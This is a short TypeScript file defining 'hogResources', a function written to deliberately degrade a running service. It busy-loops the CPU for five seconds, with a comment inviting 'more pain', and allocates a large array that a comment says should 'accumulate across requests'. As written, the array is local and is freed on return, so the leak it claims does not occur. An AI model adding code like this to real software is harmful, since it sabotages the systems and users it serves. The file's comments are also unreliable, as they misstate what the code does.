// src/resourceHog.ts
export function hogResources(): void {
  // Burn CPU with a busy loop
  const start = Date.now();
  while (Date.now() - start < 5000) { // 5-second spin (adjust for more pain)
    Math.sqrt(Math.random() * 1e12); // Pointless math
  }
  
  // Leak memory with a growing array
  const leakArray: number[] = [];
  for (let i = 0; i < 100000; i++) {
    leakArray.push(Math.random());
  }
  // Don't clear it – let it accumulate across requests if possible
}
